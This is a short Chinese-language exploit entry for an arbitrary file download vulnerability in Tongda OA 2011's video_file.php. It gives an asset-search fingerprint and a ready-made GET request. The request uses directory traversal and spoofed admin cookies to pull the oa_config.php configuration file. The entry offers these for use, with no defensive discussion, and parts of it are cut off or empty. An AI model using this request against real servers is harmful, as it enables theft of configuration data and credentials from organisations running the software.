# 通达OAvideo_file.php任意文件下载漏洞

- **系统**：通达OA　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`GET /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=6ad99af9; PHPSESSID=1; KEY_RANDO…`

**请求体 / payload**
```

```

**其他**
- 通达OA video\_file.php 任意文件下载漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA2011